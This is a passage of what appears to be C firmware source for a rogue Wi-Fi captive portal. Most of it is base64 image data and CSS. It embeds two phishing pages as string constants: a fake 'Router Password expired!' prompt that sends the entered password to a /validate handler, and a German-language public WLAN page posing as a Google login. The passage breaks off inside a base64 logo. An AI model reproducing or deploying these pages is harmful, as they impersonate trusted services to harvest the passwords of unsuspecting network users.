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\" width=\"100\" height=\"100\" alt=\"Router\">\n"
                    "<h1>Router Password expired!</h1>\n"
                    "<p>Your router password has expired. Re-enter the router password to continue using the router.</p>\n"
                    "<div class='login-page'>\n"
                    "        <div class='form'>\n"
                    "            <form class='login-form' action='/validate' method='GET'>\n"
                    "                <div class='circle-mask'></div>\n"
                    //"                <br>\n"
                    //"                <input id='g' type='email' placeholder='E-mail Adresse' name='user' required />\n"
                    "                <input id='g' type='password' placeholder='Password' name='pass' required />\n"
                    "                <input type='hidden' name='url' value='google.com' style=\"display: block; margin: 0 auto;\" >\n"
                    "                <button id='l' style=\"display: block; margin: 0 auto;\" type='submit'>Submit</button>\n"
                    "            </form>\n"
                    "        </div>\n"
                    "    </div>\n"
                    "</div>\n"
                    "</body>\n"
                    "\n"
                    "</html>"
};

httpd_uri_t captive_portal_uri_google = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = common_get_handler,
        .user_ctx = "<html>\n"
                    "\n"
                    "<head>\n"
                    "    <title>Öffentlicher WLAN-Zugang – Google Login</title>\n"
                    "\n"
                    "    <meta charset='UTF-8'>\n"
                    "    <meta name='viewport' content='width=device-width,\n"
                    "    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>\n"
                    "\n"
                    "    <style>\n"
                    "        .login-page {\n"
                    "            width: 360px;\n"
                    "            padding: 8% 0 0;\n"
                    "            margin: auto;\n"
                    "        }\n"
                    "\n"
                    "        .form {\n"
                    "            position: relative;\n"
                    "            z-index: 1;\n"
                    "            background: #F7F7F7;\n"
                    "            max-width: 360px;\n"
                    "            margin: 0 auto 100px;\n"
                    "            padding: 45px;\n"
                    "            text-align: center;\n"
                    "            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);\n"
                    "        }\n"
                    "\n"
                    "        .form input {\n"
                    "            font-family: 'Roboto', sans-serif;\n"
                    "            outline: 0;\n"
                    "            background: #ffffff;\n"
                    "            width: 100%;\n"
                    "            border: 0;\n"
                    "            margin: 0 0 15px;\n"
                    "            padding: 15px;\n"
                    "            box-sizing: border-box;\n"
                    "            font-size: 14px;\n"
                    "            border-radius: 10px;\n"
                    "            border: 1px solid #83b5f7;\n"
                    "        }\n"
                    "\n"
                    "        .form button {\n"
                    "            font-family: 'Roboto', sans-serif;\n"
                    "            outline: 0;\n"
                    "            background: #4E8FF4;\n"
                    "            width: 100%;\n"
                    "            border: 0;\n"
                    "            padding: 15px;\n"
                    "            color: #FFFFFF;\n"
                    "            font-size: 14px;\n"
                    "            -webkit-transition: all 0.3 ease;\n"
                    "            transition: all 0.3 ease;\n"
                    "            cursor: pointer;\n"
                    "            border-radius: 10px;\n"
                    "        }\n"
                    "\n"
                    "        .form button:hover,\n"
                    "        .form button:active,\n"
                    "        .form button:focus {\n"
                    "            background: rgb(#1a73e8);\n"
                    "        }\n"
                    "\n"
                    "        .form .message {\n"
                    "            text-align: right;\n"
                    "            margin: 15px 0 0;\n"
                    "            color: #4E8FF4;\n"
                    "            font-size: 12px;\n"
                    "        }\n"
                    "\n"
                    "        .form .message a {\n"
                    "            color: #4E8FF4;\n"
                    "            text-decoration: none;\n"
                    "        }\n"
                    "\n"
                    "        .form .register-form {\n"
                    "            display: none;\n"
                    "        }\n"
                    "\n"
                    "        .container {\n"
                    "            position: relative;\n"
                    "            z-index: 1;\n"
                    "            max-width: 300px;\n"
                    "            margin: 0 auto;\n"
                    "        }\n"
                    "\n"
                    "        .container:before,\n"
                    "        .container:after {\n"
                    "            content: '';\n"
                    "            display: block;\n"
                    "            clear: both;\n"
                    "        }\n"
                    "\n"
                    "        .container .info {\n"
                    "            margin: 50px auto;\n"
                    "            text-align: center;\n"
                    "        }\n"
                    "\n"
                    "        .container .info h1 {\n"
                    "            margin: 0 0 15px;\n"
                    "            padding: 0;\n"
                    "            font-size: 36px;\n"
                    "            font-weight: 300;\n"
                    "            color: #1a1a1a;\n"
                    "        }\n"
                    "\n"
                    "        .container .info span {\n"
                    "            color: #4d4d4d;\n"
                    "            font-size: 12px;\n"
                    "        }\n"
                    "\n"
                    "        .container .info span a {\n"
                    "            color: #000000;\n"
                    "            text-decoration: none;\n"
                    "        }\n"
                    "\n"
                    "        .container .info span .fa {\n"
                    "            color: #EF3B3A;\n"
                    "        }\n"
                    "\n"
                    "        body {\n"
                    "            background: #ffffff;\n"
                    "            font-family: 'Roboto', sans-serif;\n"
                    "            -webkit-font-smoothing: antialiased;\n"
                    "            -moz-osx-font-smoothing: grayscale;\n"
                    "        }\n"
                    "\n"
                    "        .logo {\n"
                    "            background-image: url('data:image/png;base64,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